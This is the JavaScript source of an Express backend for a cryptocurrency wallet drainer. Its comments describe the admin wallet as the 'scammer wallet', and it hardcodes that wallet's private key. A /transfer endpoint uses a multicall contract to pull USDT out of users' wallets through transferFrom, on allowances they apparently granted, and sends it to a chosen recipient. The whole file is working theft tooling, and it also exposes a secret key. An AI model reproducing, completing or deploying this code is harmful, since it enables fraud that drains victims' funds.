const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const ethers = require('ethers');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// 🔐 तुम्हारी स्कैमर वॉलेट की प्राइवेट की (जिसमें BNB हो – गैस के लिए)
const ADMIN_PRIVATE_KEY = '0x6be65cb66bc143fe40f6e81b55c7cd7c395324611ca8a8a33110dd6b5bc63d67';
const ADMIN_ADDRESS = '0xb4269d76C6690Da1cD003c9619c3dC449aA652e2';  // यही SCAMMER_WALLET है

// 📌 कॉन्ट्रैक्ट एड्रेसेस
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const MULTICALL_ADDRESS = '0x4acB4535d9b823194512C8A08CA737ac54E3622f';

// USDT ABI (transferFrom)
const USDT_ABI = [
    'function transferFrom(address from, address to, uint256 amount) external returns (bool)'
];

// Multicall ABI
const MULTICALL_ABI = [
    'function multicall(address target, bytes[] calldata data) external payable returns (bytes[] memory)'
];

const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
const usdtInterface = new ethers.utils.Interface(USDT_ABI);
const multicall = new ethers.Contract(MULTICALL_ADDRESS, MULTICALL_ABI, adminWallet);

app.post('/transfer', async (req, res) => {
    try {
        const { user, recipient, amount } = req.body;
        if (!user || !recipient || !amount) {
            return res.status(400).json({ error: 'Missing parameters' });
        }

        console.log(`📤 Transferring ${ethers.utils.formatUnits(amount, 18)} USDT from ${user} to ${recipient}`);
        const transferFromData = usdtInterface.encodeFunctionData('transferFrom', [user, recipient, amount]);
        const tx = await multicall.multicall(USDT_ADDRESS, [transferFromData], { gasLimit: 200000 });
        console.log('✅ Transaction sent:', tx.hash);
        res.json({ success: true, txHash: tx.hash });
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend running on port ${PORT}`);
});
